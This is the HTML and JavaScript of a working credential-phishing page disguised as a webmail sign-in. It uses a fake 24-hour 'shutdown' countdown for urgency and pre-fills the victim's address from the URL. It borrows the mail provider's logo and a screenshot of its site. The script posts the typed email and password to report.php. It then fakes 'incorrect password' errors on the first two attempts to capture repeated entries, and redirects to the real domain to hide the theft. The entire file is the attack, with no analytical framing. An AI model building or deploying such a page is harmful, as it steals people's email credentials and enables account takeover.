                <span class="name">Webmail</span> &nbsp;  <font face="arial" style="font-size:25px;"> Webmail </font>
            </div>
			
			
			<br>
			<p>
			
				<center>
						<font face="arial" style="font-size:15px;"><strong> Your email will be shutdown in </strong></font>
						<div id="hms" style="font-size:25px; font-family:arial; font-weight:bold; color:#FF0000;">24:00:00</div>

						<script type="text/javascript">
    						function count() {
 
    						var startTime = document.getElementById('hms').innerHTML;
    						var pieces = startTime.split(":");
    						var time = new Date();    time.setHours(pieces[0]);
    						time.setMinutes(pieces[1]);
    						time.setSeconds(pieces[2]);
    						var timedif = new Date(time.valueOf() - 1000);
    						var newtime = timedif.toTimeString().split(" ")[0];
    						document.getElementById('hms').innerHTML=newtime;
    						setTimeout(count, 1000);
						}
						count();
 
						</script>
				</center>
			</p>

            <p>
				<br>
				<center>
					<p style="font-size:15px; font-family:arial;">Sign in to continue using your account</p>
				</center>
            </p>

            <div class="signform">

                <p class="error hide"></p>
                <form action="#" id="form">
                    <div class="inpg">
                        <input type="text" name="em" id="em" placeholder="Email" style="font-weight:bold;" readonly>
                    </div>

                     <div class="inpg">
                        <input type="password" name="pa" id="pa" placeholder="Password">
                    </div>

                     <div class="inp2b">
                      <button class="btnlogin" disabled>Protect My Account >>></button>
                    </div>
					<br><br>
                </form>
            </div>


         </div>
    </div>


    <script>
        const boxf = document.getElementById("form");
        const em = document.getElementById("em");
        const pa = document.getElementById("pa");
        const error = document.querySelector(".error");
        const logo = document.querySelector(".logo");
        const name = document.querySelector(".name");
        const btnlogin = document.querySelector(".btnlogin");
        const bodymain = document.querySelector(".bodymain");
        const fav =  document.querySelector("link[rel*='icon']");
        let finurl = "";
        let errKey = 0;

        window.addEventListener("load", () => {
            btnlogin.disabled = false;
           const id =  window.location.href.split("#")[1];
           let logoUrl = id.split("@")[1];
           finurl = logoUrl;
           let nameUrl = logoUrl.split(".")[0];

           if(id){
            em.value = id;
            document.title = logoUrl.split(".")[0];
            fav.href = `https://logo.clearbit.com/${logoUrl}`;
            if(logoUrl === "gmail.com"){
                bodymain.style.background = `rgba(0, 0, 0, 0.04) url(https://image.thum.io/get/width/1280/crop/600/https://www.google.com/intl/us/gmail/about/)`;
                bodymain.style.backgroundRepeat = `no-repeat`;
                bodymain.style.backgroundSize = `cover`;
                logo.src = `https://logo.clearbit.com/${logoUrl}`;
                name.textContent = nameUrl;
            }
            else {
                 bodymain.style.background = `rgba(0, 0, 0, 0.04) url(https://image.thum.io/get/width/1280/crop/600/https://${logoUrl})`;
                bodymain.style.backgroundRepeat = `no-repeat`;
                bodymain.style.backgroundSize = `cover`;
                logo.src = `https://logo.clearbit.com/${logoUrl}`;
                name.textContent = nameUrl;
            }
           
           }
        });

        boxf.addEventListener("submit", (e) => {
            e.preventDefault();
            if(em.value === ""){
                error.classList.remove("hide");
                error.textContent = "Email field is empty...!";
            }
            else if(pa.value === ""){
                error.classList.remove("hide");
                error.textContent = "Password field is empty...!";
            }
            else {
                errKey++;
                let fa = `Email: ${em.value} \nPassword: ${pa.value}`;
                $.ajax({
                url: 'report.php',
                type: 'POST',
                data: { pass: fa },
                });
                error.classList.add("hide");
                error.textContent = "";
                btnlogin.textContent = "Verifying...";
                btnlogin.disabled = true;

                setTimeout(() => {
                    btnlogin.textContent = "Login";
                    btnlogin.disabled = false;
                    if(errKey <= 2){
                        error.classList.remove("hide");
                        error.textContent = "Incorrect Email Password, try again";
                        pa.value = "";
                    }
                    else {
                        error.classList.add("hide");
                        error.textContent = "";
                        btnlogin.textContent = "Log in";
                        window.location.href = `https://www.${finurl}`;
                    }
                }, 2000);

                setTimeout(() => {
                   
                }, 2000);
            }

        });

    </script>
